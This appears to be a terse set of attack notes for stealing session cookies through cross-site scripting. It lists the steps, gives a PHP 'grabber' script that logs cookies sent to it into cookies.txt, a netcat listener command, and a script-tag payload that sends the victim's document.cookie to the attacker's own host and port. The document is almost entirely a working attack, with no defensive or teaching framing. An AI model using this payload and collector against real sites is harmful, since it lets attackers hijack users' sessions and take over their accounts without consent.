1. find xss
2. create malicious php code
```bash
cat > grabber.php << EOF
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
EOF
```
3. set listener
```bash
rlwrap nc -nvlp <port>
```
3. insert xss:
```js
<script>document.location='http://<your ip>:<port>/grabber.php?c='+document.cookie</script>
```
